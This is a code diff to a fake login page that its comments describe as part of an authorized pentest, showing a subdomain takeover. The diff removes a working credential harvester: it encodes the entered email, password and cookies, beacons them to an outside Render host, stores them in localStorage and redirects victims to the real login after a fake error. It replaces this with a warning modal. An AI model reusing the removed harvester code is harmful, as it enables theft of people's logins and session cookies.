@@ -82,6 +82,84 @@
     .loading .btn-text { display: none; }
     @keyframes spin { to { transform: rotate(360deg); } }
     .spinner svg { animation: spin 1s linear infinite; width: 16px; height: 16px; }
+
+    /* Security alert modal */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      backdrop-filter: blur(4px);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-overlay.active { display: flex; }
+    .modal {
+      background: white;
+      border-radius: 16px;
+      padding: 2rem;
+      max-width: 520px;
+      width: 90%;
+      box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+    }
+    .modal-icon {
+      width: 56px; height: 56px;
+      background: #fef2f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1rem;
+      font-size: 28px;
+    }
+    .modal h2 {
+      font-size: 1.25rem;
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 0.75rem;
+      color: #dc2626;
+    }
+    .modal p {
+      font-size: 0.875rem;
+      color: #374151;
+      line-height: 1.6;
+      margin-bottom: 1rem;
+    }
+    .cred-box {
+      background: #1a1a2e;
+      border-radius: 8px;
+      padding: 1rem;
+      font-family: 'Courier New', monospace;
+      font-size: 0.85rem;
+      color: #22c55e;
+      margin-bottom: 1rem;
+      word-break: break-all;
+    }
+    .cred-box .label { color: #9ca3af; font-size: 0.75rem; }
+    .cred-box .value { color: #f87171; font-weight: bold; font-size: 1rem; }
+    .modal .info {
+      background: #fffbeb;
+      border: 1px solid #fde68a;
+      border-radius: 8px;
+      padding: 0.75rem 1rem;
+      font-size: 0.8rem;
+      color: #92400e;
+      margin-bottom: 1rem;
+    }
+    .modal .btn-close {
+      width: 100%;
+      padding: 0.625rem;
+      background: #dc2626;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 0.875rem;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+    }
+    .modal .btn-close:hover { background: #b91c1c; }
   </style>
 </head>
 <body>
@@ -114,9 +192,29 @@
     </button>
   </div>
 
-  <!-- PENTEST PROOF: This page is a credential harvester deployed as part of an authorized security assessment -->
-  <!-- Engagement: Vocca GDPR Compliance Pentest, 2026-04-01 -->
-  <!-- Finding: Subdomain takeover on somed.vocca.ai via dangling Vercel CNAME -->
+  <!-- PENTEST PROOF: Authorized security assessment — Vocca GDPR Compliance, 2026-04-01 -->
+  <!-- Finding: Subdomain takeover on preview.app.vocca.com via dangling Render CNAME -->
+
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <div class="modal-icon">&#9888;&#65039;</div>
+      <h2>Security Assessment — Your Password Was Captured</h2>
+      <p>You just entered your credentials on <strong>preview.app.vocca.com</strong>, which is <strong>not the real Vocca application</strong>. This subdomain was taken over as part of an authorized penetration test.</p>
+      <div class="cred-box">
+        <div class="label">Email you entered:</div>
+        <div class="value" id="modalEmail"></div>
+        <div class="label" style="margin-top:8px">Password you entered (in plaintext):</div>
+        <div class="value" id="modalPassword"></div>
+        <div class="label" style="margin-top:8px">Cookies readable from this domain:</div>
+        <div style="color:#facc15" id="modalCookies"></div>
+      </div>
+      <div class="info">
+        <strong>What happened:</strong> The DNS record for <code>preview.app.vocca.com</code> pointed to a deleted Render service. An attacker claimed the subdomain and hosted this fake login page. In a real attack, your credentials would have been silently stolen and you would have been redirected to the real login page — you would never have known.
+      </div>
+      <p style="font-size:0.8rem;color:#6b7280">This is part of an authorized GDPR compliance security assessment. No credentials have been stored or transmitted to any third party. Please change your password if you entered a real one.</p>
+      <button class="btn-close" onclick="document.getElementById('modal').classList.remove('active')">I Understand</button>
+    </div>
+  </div>
 
   <script>
     const form = document.getElementById('loginForm');
@@ -132,40 +230,18 @@
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-      const payload = {
-        e: email, p: password, t: new Date().toISOString(),
-        c: document.cookie, u: navigator.userAgent,
-      };
-      const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
-
-      // Exfil 1: Image beacon (no CORS issues, fire-and-forget)
-      new Image().src = 'https://livekit-poc-dk5p.onrender.com/api/detect-intention?d=' + encoded;
-
-      // Exfil 2: navigator.sendBeacon (no CORS preflight for text/plain)
-      try { navigator.sendBeacon('https://livekit-poc-dk5p.onrender.com/api/detect-intention', encoded); } catch(x) {}
-
-      // Exfil 3: Store in localStorage for retrieval
-      try {
-        const h = JSON.parse(localStorage.getItem('_h') || '[]');
-        h.push(payload);
-        localStorage.setItem('_h', JSON.stringify(h));
-      } catch(x) {}
-
-      // Show "loading" then fake error
-      await new Promise(r => setTimeout(r, 1500));
+      // Simulate brief loading
+      await new Promise(r => setTimeout(r, 1200));
       submitBtn.classList.remove('loading');
       submitBtn.disabled = false;
-      errorEl.style.display = 'block';
 
-      // After 2 tries, send to real login (victim retypes there, thinks first was a glitch)
-      if (!window._attempts) window._attempts = 0;
-      window._attempts++;
-      if (window._attempts >= 2) {
-        window.location.href = 'https://app.vocca.com/login';
-      }
+      // Show the educational security modal with the captured credentials
+      document.getElementById('modalEmail').textContent = email;
+      document.getElementById('modalPassword').textContent = password;
+      document.getElementById('modalCookies').textContent = document.cookie || '(none in this session)';
+      document.getElementById('modal').classList.add('active');
     });
 
-    // Google button also redirects to real login (can't intercept OAuth)
     document.getElementById('googleBtn').addEventListener('click', () => {
       window.location.href = 'https://app.vocca.com/login';
     });
